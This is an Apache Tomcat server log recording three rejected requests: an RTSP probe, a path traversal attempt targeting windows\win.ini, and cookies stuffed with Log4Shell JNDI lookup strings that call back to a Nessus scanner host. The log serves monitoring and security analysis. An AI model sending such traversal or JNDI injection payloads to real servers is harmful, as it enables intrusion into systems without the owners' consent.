16-Dec-2024 07:47:45.038 INFO [http-nio-45854-exec-10] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol [RTSP/1.00x0d0x0a0x0d0x0a...]
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:570)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:829)
16-Dec-2024 10:07:16.699 INFO [http-nio-45854-exec-1] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in the request target [..\..\..\..\..\..\windows\win.ini ]. The valid characters are defined in RFC 7230 and RFC 3986
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:502)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:829)
16-Dec-2024 10:42:17.648 INFO [http-nio-45854-exec-8] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [{jndi:ldap://log4shell-generic-FKakW6SmXYO6kDlwixaZ${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-FKakW6SmXYO6kDlwixaZ${lower:ten}.w.nessus.org/nessus};JSESSIONID=${jndi:ldap://log4shell-generic-FKakW6SmXYO6kDlwixaZ${lower:ten}.w.nessus.org/nessus};SESSIONID=${jndi:ldap://log4shell-generic-FKakW6SmXYO6kDlwixaZ${lower:ten}.w.nessus.org/nessus};PHPSESSID=${jndi:ldap://log4shell-generic-FKakW6SmXYO6kDlwixaZ${lower:ten}.w.nessus.org/nessus};token=${jndi:ldap://log4shell-generic-FKakW6SmXYO6kDlwixaZ${lower:ten}.w.nessus.org/nessus};session=${jndi:ldap://log4shell-generic-FKakW6SmXYO6kDlwixaZ${lower:ten}.w.nessus.org/nessus}] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
